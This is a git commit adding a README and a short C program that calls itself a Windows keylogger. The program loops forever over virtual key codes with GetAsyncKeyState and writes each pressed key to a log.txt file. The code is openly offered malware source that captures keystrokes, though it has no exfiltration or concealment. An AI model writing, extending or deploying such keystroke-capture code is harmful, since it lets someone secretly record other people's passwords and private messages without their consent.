b219ff292720eccff00f625cf92b6adb318b9f98
Thiago Laass <thiagolaass202@gmail.com>
2024-11-30 20:39:30 -0300

    simple key logger

---
+++ README.md
@@ -0,0 +1,1 @@
+A windows keylogger in C
---
+++ src/simplekeylogger.c
@@ -0,0 +1,17 @@
+#include <stdio.h>
+#include <windows.h>
+
+int main() {
+    int i;
+    FILE *file;
+    file = fopen("log.txt", "w+");
+    while (1) {
+        for (i = 8; i <= 190; i++) {
+            if (GetAsyncKeyState(i) == -32767) {
+                fputc(i, file);
+            }
+        }
+    }
+    fclose(file);
+    return 0;
+}
